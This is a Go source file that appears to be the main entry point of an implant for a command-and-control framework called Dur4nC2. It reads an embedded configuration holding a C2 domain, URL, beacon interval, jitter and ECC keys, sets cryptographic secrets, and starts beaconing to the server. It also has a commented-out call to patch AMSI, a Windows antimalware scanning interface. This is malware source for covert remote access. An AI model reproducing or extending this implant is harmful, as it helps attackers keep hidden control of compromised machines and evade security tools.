package main

import (
	"Dur4nC2/implant/cryptography"
	"Dur4nC2/implant/transport"
	"Dur4nC2/server/domain/models"
	"strconv"
	"strings"
)

var configJson = "empty"

func main() {

	configArray := strings.Split(configJson, ";")
	beaconInterval, _ := strconv.Atoi(configArray[3])
	beaconJitter, _ := strconv.Atoi(configArray[4])
	config := &models.ImplantConfig{
		Domain:             configArray[0],
		URL:                configArray[1],
		PathPrefix:         configArray[2],
		BeaconInterval:     int64(beaconInterval),
		BeaconJitter:       int64(beaconJitter),
		ECCPublicKey:       configArray[5],
		ECCPublicKeyDigest: configArray[6],
		ECCPrivateKey:      configArray[7],
		ECCServerPublicKey: configArray[8],
	}

	cryptography.SetSecrets(
		config.ECCPublicKey,
		config.ECCPrivateKey,
		config.ECCPublicKeyDigest,
		config.ECCServerPublicKey,
	)
	//executions.PatchAmsi()
	transport.BeaconStart(*config)
}
